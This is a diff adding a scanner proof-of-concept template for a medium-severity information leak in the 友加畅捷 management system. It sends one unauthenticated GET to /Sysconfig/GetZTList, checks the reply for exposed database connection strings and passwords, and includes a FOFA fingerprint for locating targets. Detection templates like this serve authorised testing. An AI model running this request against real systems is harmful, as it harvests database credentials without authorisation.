@@ -1,0 +1,16 @@
+id: poc-yaml-youjiasoft-getztlist-info-leak
+info:
+  name: 友加畅捷管理系统 GetZTList 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 友加畅捷管理系统
+  fofa: icon_hash="2049187099"
+requests:
+- method: GET
+  path: /Sysconfig/GetZTList
+  expression: status_code == 200 && contains(body,"\"DBName\":") && contains(body,"Data
+    Source=") && contains(body,"user=") && contains(content_type,"application/json")
+    && matches(body,`"pwd":"([A-Za-z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?~]+)",`)
+variables: {}
+transport: http
